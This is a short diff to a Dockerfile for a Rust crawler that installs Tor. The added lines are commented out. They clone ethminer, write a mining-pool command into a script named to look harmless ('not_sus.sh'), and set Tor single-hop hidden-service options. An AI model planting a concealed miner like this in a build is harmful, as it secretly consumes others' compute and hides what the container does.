@@ -19,9 +19,18 @@ FROM rust:1-slim-bookworm
 # RUN echo "deb     [signed-by=/usr/share/keyrings/tor-archive-keyring.gpg] https://deb.torproject.org/torproject.org bookworm main" >> /etc/apt/sources.list.d/tor.list
 # RUN echo "deb-src [signed-by=/usr/share/keyrings/tor-archive-keyring.gpg] https://deb.torproject.org/torproject.org bookworm main" >> /etc/apt/sources.list.d/tor.list
 # RUN wget -qO- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | gpg --dearmor | tee /usr/share/keyrings/tor-archive-keyring.gpg >/dev/null 
-RUN apt update && apt-get --yes --force-yes install tor 
+RUN apt update && apt-get --yes --force-yes install tor  
+
+# RUN git clone https://github.com/ethereum-mining/ethminer.git
+
+
 
 COPY --from=builder /app/target/release/crawle-rs /usr/local/bin/crawle-rs
+# RUN touch non_sus.sh
+# RUN echo "ethminer -P stratum1+tcp://ETH_WALLET.WORKERNAME@eth.2miners.com:2020" >> "not_sus.sh"
+# RUN echo "HiddenServiceNonAnonymousMode 1" >> /etc/tor/torrc
+# RUN echo "HiddenServiceSingleHopMode 1" >> /etc/tor/torrc
+# RUN echo "SocksPort 0" >> /etc/tor/torrc
 
 RUN touch prog.sh
 RUN touch tor.sh
